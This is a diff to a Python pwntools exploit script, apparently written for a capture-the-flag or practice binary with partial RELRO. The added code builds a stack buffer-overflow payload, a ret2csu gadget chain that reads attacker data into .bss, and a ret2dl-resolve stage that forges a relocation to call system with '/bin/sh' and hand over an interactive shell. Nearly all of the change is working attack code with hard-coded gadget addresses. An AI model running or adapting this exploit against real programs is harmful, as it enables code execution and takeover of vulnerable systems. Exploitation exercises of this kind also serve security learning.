@@ -1,10 +1,6 @@
 from pwn import *
 import math
 
-def debug_on():
-	if (args.DEBUG):
-		context.log_level = "debug"
-
 g_fname = args.FNAME if (args.FNAME) else "./main_partial_relro_64"
 g_elf = ELF(g_fname)
 context.binary = g_elf
@@ -28,6 +24,29 @@ def get_aligned_addr(base_addr, unaligned_addr, alignment):
 	off = unaligned_addr - base_addr
 	idx = math.ceil(off / alignment)
 	return base_addr + idx*alignment
+
+def rop2read(buf, cnt):
+	got_read = g_elf.got["read"]
+	# mov %r15, %rdx; mov %r14, %rsi; mov %r13d, %edi;
+	# callq *(%r12, %rbx, 8)
+	# add $1, %rbx; cmp %rbx, %rbp; jne 0x400780;
+	# add $8, %rsp; 
+	# csu_end: ...
+	addr_csu_front = 0x400780
+	# pop %rbx; pop %rbp; pop %r12~%r15; ret
+	addr_csu_end = 0x40079a
+	payload = flat([
+		addr_csu_end, 
+		0, # rbx
+		1, # rbp,
+		got_read, # r12
+		0, # r13->edi, 0 means read from stdin
+		buf, # r14->rsi
+		cnt, # r15->rdx
+		addr_csu_front,
+		p64(0) * 7
+	])
+	return payload
 
 def pwn():
 	# segment writable [0x601000, 0x602000)
@@ -124,9 +143,44 @@ def pwn():
 		(fake_reloc_addr - data_addr): fake_reloc_obj
 	})
 	log.debug("full_data_payload's length = %d\n", len(full_data_payload))
-	
+
+	# Ready to rop!!!
+	vuln_addr = 0x400637
+	bof_padding = 'a'*0x78
+	payload_read_data_to_bss = rop2read(data_addr, len(full_data_payload))
+	payload_rop2read = flat([
+		bof_padding,
+		payload_read_data_to_bss,
+		vuln_addr # bof again
+	])
+	log.debug("length of payload_rop2read = %#x\n", len(payload_rop2read))
+	assert(len(payload_rop2read) <= 0x100)
+
+	getpid()
+	# 1st send: rop to read(0, addr_at_bss, count), preparing for ret2dl-resolve.
+	g_io.send(payload_rop2read)
+
+	# 2nd send: write full_data_payload to .bss
+	g_io.send(full_data_payload)
+
+	p_rdi = 0x4007a3 # pop rdi; ret
+	plt0_addr = 0x400500
+	payload_dlresolve = flat([
+		bof_padding,
+		plt0_addr, 
+		fake_reloc_idx,
+		p_rdi,
+		binsh_addr, 
+		0xdeadbeef # where the system() may return.
+	])
+	log.debug("length of payload_dlresolve = %#x\n", len(payload_dlresolve))
+	assert(len(payload_dlresolve) <= 0x100)
+	# 3rd send: ret2dlresolve end get shell.
+	g_io.send(payload_dlresolve)
+
 
 if ("__main__" == __name__):
-	debug_on()
+	if (args.DEBUG):
+		context.log_level = "debug"
 	pwn()
 	g_io.interactive()
